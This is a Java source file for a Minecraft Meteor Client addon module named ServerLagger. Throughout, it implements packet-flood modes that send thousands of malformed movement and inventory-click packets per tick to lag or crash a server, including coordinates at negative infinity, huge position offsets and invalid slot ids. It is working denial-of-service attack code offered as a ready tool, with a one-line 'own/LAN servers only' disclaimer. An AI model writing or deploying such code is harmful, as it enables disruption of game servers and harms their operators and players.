package com.codigohasta.addon.modules;

import com.codigohasta.addon.AddonTemplate;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import java.util.Random;
import meteordevelopment.meteorclient.events.game.GameJoinedEvent;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent.Pre;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.EnumSetting.Builder;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.Full;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.LookAndOnGround;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;

public class ServerLagger extends Module {
   private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
   private final Setting<ServerLagger.Mode> mode = this.sgGeneral
      .add(
         ((Builder)((Builder)((Builder)new Builder().name("mode")).description("Which core movement / window / click-slot lag method to use."))
               .defaultValue(ServerLagger.Mode.SelfLag))
            .build()
      );
   private final Setting<Integer> armorPackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("armor-packets"))
                     .description("Packets per tick for the armor mode."))
                  .defaultValue(1000))
               .min(1)
               .max(10000)
               .sliderMin(1)
               .sliderMax(10000)
               .visible(() -> this.mode.get() == ServerLagger.Mode.ARMOR))
            .build()
      );
   private final Setting<Integer> windowPackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("window-packets"))
                     .description("Packets per tick for the window mode."))
                  .defaultValue(6))
               .min(2)
               .max(12)
               .sliderMin(2)
               .sliderMax(12)
               .visible(() -> this.mode.get() == ServerLagger.Mode.Window))
            .build()
      );
   private final Setting<Integer> aacPackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("aac-packets"))
                     .description("Packets per tick for the AAC / null-position modes."))
                  .defaultValue(5000))
               .min(1)
               .max(10000)
               .sliderMin(1)
               .sliderMax(10000)
               .visible(
                  () -> this.mode.get() == ServerLagger.Mode.AAC
                     || this.mode.get() == ServerLagger.Mode.AAC2
                     || this.mode.get() == ServerLagger.Mode.NullPosition
               ))
            .build()
      );
   private final Setting<Integer> clickSlotPackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("slot-packets"))
                     .description("Packets per tick for the invalid-click-slot mode."))
                  .defaultValue(15))
               .min(1)
               .max(100)
               .sliderMin(1)
               .sliderMax(100)
               .visible(() -> this.mode.get() == ServerLagger.Mode.InvalidClickSlot))
            .build()
      );
   private final Setting<Integer> movementPackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("movement-packets"))
                     .description("Packets per tick for the movement-spam mode."))
                  .defaultValue(2000))
               .min(1)
               .max(10000)
               .sliderMin(1)
               .sliderMax(10000)
               .visible(() -> this.mode.get() == ServerLagger.Mode.MovementSpam))
            .build()
      );
   private final Setting<Boolean> autoDisable = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)new meteordevelopment.meteorclient.settings.BoolSetting.Builder()
                     .name("auto-disable"))
                  .description("Disable the module when you join or leave a world."))
               .defaultValue(true))
            .build()
      );
   private final Setting<Boolean> smartDisable = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)new meteordevelopment.meteorclient.settings.BoolSetting.Builder()
                     .name("smart-disable"))
                  .description("Automatically disable the module when a mode finishes or errors out."))
               .defaultValue(true))
            .build()
      );
   private final Setting<Integer> delay = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                     .name("delay"))
                  .description("Ticks to wait between bursts of packets."))
               .defaultValue(1))
            .min(0)
            .max(100)
            .sliderMin(0)
            .sliderMax(100)
            .build()
      );
   private int ticks = 0;

   public ServerLagger() {
      super(
         AddonTemplate.OP_CATEGORY,
         "ServerLagger",
         "Core movement / window / click-slot flood modes (AAC, Chunk, SelfLag, Window, ARMOR, etc.). Testing on your own / LAN servers only."
      );
   }

   @EventHandler
   private void onTick(Pre event) {
      if (this.mc.player != null && this.mc.world != null) {
         this.ticks++;
         if (this.ticks > (Integer)this.delay.get()) {
            this.ticks = 0;
            switch ((ServerLagger.Mode)this.mode.get()) {
               case AAC:
                  for (double i = 0.0; i < ((Integer)this.aacPackets.get()).intValue(); i++) {
                     this.mc
                        .getNetworkHandler()
                        .sendPacket(
                           new PositionAndOnGround(
                              this.mc.player.getX() + 9412.0 * i,
                              this.mc.player.getY() + 9412.0 * i,
                              this.mc.player.getZ() + 9412.0 * i,
                              true,
                              false
                           )
                        );
                  }

                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
                  break;
               case AAC2:
                  for (double i = 0.0; i < ((Integer)this.aacPackets.get()).intValue(); i++) {
                     this.mc
                        .getNetworkHandler()
                        .sendPacket(
                           new PositionAndOnGround(
                              this.mc.player.getX() + 500000.0 * i,
                              this.mc.player.getY() + 500000.0 * i,
                              this.mc.player.getZ() + 500000.0 * i,
                              true,
                              false
                           )
                        );
                  }

                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
                  break;
               case Chunk:
                  for (double yPos = this.mc.player.getY(); yPos < 255.0; yPos += 5.0) {
                     this.mc
                        .getNetworkHandler()
                        .sendPacket(new PositionAndOnGround(this.mc.player.getX(), yPos, this.mc.player.getZ(), true, false));
                  }

                  for (double i = 0.0; i < 6685.0; i += 5.0) {
                     this.mc
                        .getNetworkHandler()
                        .sendPacket(new PositionAndOnGround(this.mc.player.getX() + i, 255.0, this.mc.player.getZ() + i, true, false));
                  }
                  break;
               case MovementSpam:
                  if (this.mc.getNetworkHandler() == null) {
                     return;
                  }

                  try {
                     double x = this.mc.player.getX();
                     double y = this.mc.player.getY();
                     double z = this.mc.player.getZ();

                     for (int i = 0; i < this.movementPackets.get(); i++) {
                        Full move = new Full(
                           x + this.getDistributedRandom(1.0),
                           y + this.getDistributedRandom(1.0),
                           z + this.getDistributedRandom(1.0),
                           (float)rndD(90.0),
                           (float)rndD(180.0),
                           true,
                           false
                        );
                        this.mc.getNetworkHandler().sendPacket(move);
                     }
                  } catch (Exception var10) {
                     ChatUtils.sendPlayerMsg("§4[!] " + var10.getMessage());
                     var10.printStackTrace();
                     if ((Boolean)this.smartDisable.get()) {
                        this.disable();
                     }
                  }
                  break;
               case NullPosition:
                  for (double i = 0.0; i < ((Integer)this.aacPackets.get()).intValue(); i++) {
                     this.mc
                        .getNetworkHandler()
                        .sendPacket(new PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true, false));
                  }

                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
                  break;
               case SelfLag:
                  this.mc.getNetworkHandler().sendPacket(new LookAndOnGround(0.0F, 0.0F, true, false));
                  this.mc.getNetworkHandler().sendPacket(new LookAndOnGround(180.0F, 0.0F, true, false));
                  this.mc.getNetworkHandler().sendPacket(new LookAndOnGround(0.0F, 0.0F, true, false));
                  this.mc.getNetworkHandler().sendPacket(new LookAndOnGround(180.0F, 0.0F, true, false));
                  break;
               case Window:
                  ScreenHandler handler = this.mc.player.currentScreenHandler;
                  Int2ObjectArrayMap<ItemStackHash> itemMap = new Int2ObjectArrayMap();
                  itemMap.put(0, hashOf(new ItemStack(Items.ACACIA_BOAT, 1)));

                  for (int ix = 0; ix < this.windowPackets.get() + 1; ix++) {
                     this.mc
                        .getNetworkHandler()
                        .sendPacket(
                           new ClickSlotC2SPacket(
                              handler.syncId,
                              handler.getRevision(),
                              (short)36,
                              (byte)-1,
                              SlotActionType.SWAP,
                              itemMap,
                              hashOf(handler.getCursorStack().copy())
                           )
                        );
                  }
                  break;
               case ARMOR:
                  for (int i = 0; i < this.armorPackets.get(); i++) {
                     if (this.mc.player.getInventory().getStack(38).getItem() != Items.AIR) {
                        this.mc
                           .getNetworkHandler()
                           .sendPacket(
                              new ClickSlotC2SPacket(
                                 this.mc.player.currentScreenHandler.syncId,
                                 this.mc.player.currentScreenHandler.getRevision(),
                                 (short)6,
                                 (byte)0,
                                 SlotActionType.SWAP,
                                 Int2ObjectMaps.emptyMap(),
                                 hashOf(this.mc.player.currentScreenHandler.getCursorStack().copy())
                              )
                           );
                     }
                  }
                  break;
               case InvalidClickSlot:
                  Int2ObjectMap<ItemStackHash> REAL = new Int2ObjectArrayMap();
                  REAL.put(0, hashOf(new ItemStack(Items.RED_DYE, 1)));

                  for (int i = 0; i < this.clickSlotPackets.get(); i++) {
                     this.mc
                        .getNetworkHandler()
                        .sendPacket(
                           new ClickSlotC2SPacket(
                              this.mc.player.currentScreenHandler.syncId,
                              123344,
                              (short)8114,
                              (byte)103,
                              SlotActionType.PICKUP,
                              REAL,
                              hashOf(new ItemStack(Items.AIR, -1))
                           )
                        );
                  }
            }
         }
      } else {
         if ((Boolean)this.autoDisable.get()) {
            this.disable();
         }
      }
   }

   @EventHandler
   private void onGameJoined(GameJoinedEvent event) {
      if ((Boolean)this.autoDisable.get()) {
         this.disable();
      }
   }

   @EventHandler
   private void onGameLeft(GameLeftEvent event) {
      if ((Boolean)this.autoDisable.get()) {
         this.disable();
      }
   }

   public double getDistributedRandom(double rad) {
      return rndD(rad) - rad / 2.0;
   }

   public static double rndD(double rad) {
      Random r = new Random();
      return r.nextDouble() * rad;
   }

   private static ItemStackHash hashOf(ItemStack stack) {
      return ItemStackHash.fromItemStack(stack, c -> 0);
   }

   public void onDeactivate() {
      this.ticks = 999;
   }

   public static enum Mode {
      AAC,
      AAC2,
      Chunk,
      MovementSpam,
      NullPosition,
      SelfLag,
      Window,
      ARMOR,
      InvalidClickSlot;
   }
}
